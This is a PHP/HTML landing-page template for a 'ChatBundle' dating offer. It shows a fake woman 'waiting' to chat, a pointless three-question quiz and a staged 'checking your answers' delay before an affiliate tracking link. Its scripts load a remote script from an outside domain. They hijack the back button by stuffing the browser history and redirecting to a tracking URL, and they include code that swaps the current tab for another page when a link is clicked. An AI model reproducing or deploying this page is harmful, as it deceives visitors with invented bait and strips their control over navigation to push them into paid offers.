<?php
# Modified by Agent F
# Version : 1.0
#
# set name of app/domain or offer
$domain = "ChatBundle app";
# set the name of the person chatting
$name = "Amahle";
# set image of person chatting
$img = "avatar.jpg";
# set title of page
$title = "Chat with $name";
# set offer link
$offer = "https://v.newlyclicked.com/click";
# set Yes/No as vars so can easy change for translations etc.
$y = "Yes";
$n = "No";
# set the questions for the form
$q1 = "Do you want to chat with $name? Answer 3 questions to connect...";
$q2 = "Did you receive a message from her? ☝️";
$q3 = "Are you interested in connecting with $name?";
$q4 = "Have you previously signed up for the $domain?";
$q5 = "Checking your answers...";
$q6 = "$name is waiting!";
# text on results div at end 
$r1 = "Click <strong>HERE</strong> to Connect and Chat 👍";
$r2 = "(it takes about 1 minute to register and connect)";
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
	<title><?= $title; ?></title>
	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
	<style>
		body {
			background-color: #e3e3e3;
		}

		.picture {
			width: 50%;
			border: 1px solid #fff;
		}

		#questions {
			border: 1px solid #fff;
			padding: 15px;
			background: #fff;
			color: #333;
		}
	</style>
</head>

<body>
	<div class="container">
		<div class="row">
			<div class="col-sm-12" style="text-align: center">
				<h1><?= $title; ?></h1>
			</div>
		</div>
		<div class="row">
			<div class="col-sm-6" style="text-align: center"><img src="<?= $img; ?>" alt="<?= $name; ?>" class="picture"></div>
			<div class="col-sm-6">
				<h3><?= $q1; ?></h3>
				<div id="questions">
					<div class="question">
						<h3><?= $q2; ?></h3>
						<a href="#" class="btn btn-success btn-block answer"><?= $y; ?></a><a href="#" class="btn btn-danger btn-block answer"><?= $n; ?></a>
					</div>
					<div class="question" style="display: none">
						<h3><?= $q3; ?></h3>
						<a href="#" class="btn btn-success btn-block answer"><?= $y; ?></a><a href="#" class="btn btn-danger btn-block answer"><?= $n; ?></a>
					</div>
					<div class="question" style="display: none">
						<h3><?= $q4; ?></h3>
						<a href="#" class="btn btn-success btn-block answer"><?= $y; ?></a><a href="#" class="btn btn-danger btn-block answer"><?= $n; ?></a>
					</div>
					<div class="checking" style="display: none;text-align:center;">
						<h3><?= $q5; ?></h3><img src="loading.gif" alt="Loading...">
					</div>
					<div class="results" style="display: none;text-align:center;">
						<h3><?= $q6; ?></h3>
						<a href="<?= $offer; ?>" class="btn btn-success btn-block"><?= $r1; ?></a>
						<hr>
						<p><?= $r2; ?></p>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script src="//code.jquery.com/jquery-3.2.1.slim.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script>
		$(function() {
			$(".answer").click(function(t) {
				t.preventDefault(), $(this).parent().hide(), $(this).parent().next().show(), "checking" == $(this).parent().next().attr("class") && setTimeout(function() {
					$(".checking").hide(), $(".results").show()
				}, 2e3)
			})
		});
	</script>

	<script>
		var back = 'https://track.toackeerby.shop/cwdhl0k.php?lp=1';
		//	var under = 'https://track.toackeerby.shop/cwdhl0k.php?lp=1&to_offer=1';
	</script>
	<script src="https://backunder.com/script.js"></script>
	<script>
		if (typeof under !== "undefined" && under !== null) {
			if (typeof cta !== "undefined" && cta !== null) {
				document.addEventListener('click', function(event) {
					var
						target = event.target;
					while (target) {
						if (target.tagName === 'A' && target.classList.contains(cta)) {
							const
								linkHref = target.href;
							event.preventDefault();
							window.open(linkHref, '_blank');
							window.location.replace(under);
							break;
						}
						target = target.parentNode;
					}
				});
			} else {
				document.addEventListener('click', function(event) {
					var
						target = event.target;
					while (target) {
						if (target.tagName === 'A') {
							const
								linkHref = target.href;
							event.preventDefault();
							window.open(linkHref, '_blank');
							window.location.replace(under);
							break;
						}
						target = target.parentNode;
					}
				});
			}
		}
		if (typeof back !== "undefined" && back !== null) {
			!(function() {
				var t;
				try {
					const
						URL = window.location.href.split(/[#]/)[0];
					for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
					onpopstate = function(event) {
						event.state && location.replace(back);
					};
				} catch (o) {
					console.log(o);
				}
			})();
		}
	</script>
</body>

</html>